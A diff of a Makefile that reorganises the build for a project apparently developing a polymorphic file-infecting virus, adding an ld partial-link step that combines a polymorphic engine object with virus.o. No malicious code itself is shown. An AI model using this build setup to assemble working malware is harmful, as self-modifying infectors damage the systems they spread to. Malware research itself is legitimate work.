@@ -35,24 +35,27 @@ ASM = nasm
 
 GCC = g++
 CC = gcc
-
+LCC = ld
 AFLAGS = -felf64 -g -F dwarf 
 
 CFLAGS = -c  -Wall -O2 -g
 
 LFLAGS = -no-pie 
 KFLAGS = -no-pie -nostartfiles -m64 -g -falign-functions=16 
-all: virus hello
+MFLAGS = -no-pie -r
+all: virus hello  polymorphic.o
 
-virus: infect.c polymorphic.c  polymorphicengine.o  virus.o
+virus: infect.c polymorphic.c  polymorphic.o
 	$(CC) $(KFLAGS) $^ -o $@
+
+polymorphic.o: polymorphicengine.o virus.o
+	$(LCC) $(MFLAGS) $^ -o $@
 
 virus.o: virus.asm template.asm.inc
 	$(ASM) $(AFLAGS) $< -o $@
 
 polyengine.o: polymake.cpp
 	$(GCC) $(CFLAGS) $< -o $@
-
 
 polymorphicengine.o: polymorphicengine.asm
 	$(ASM) $(AFLAGS) $< -o $@
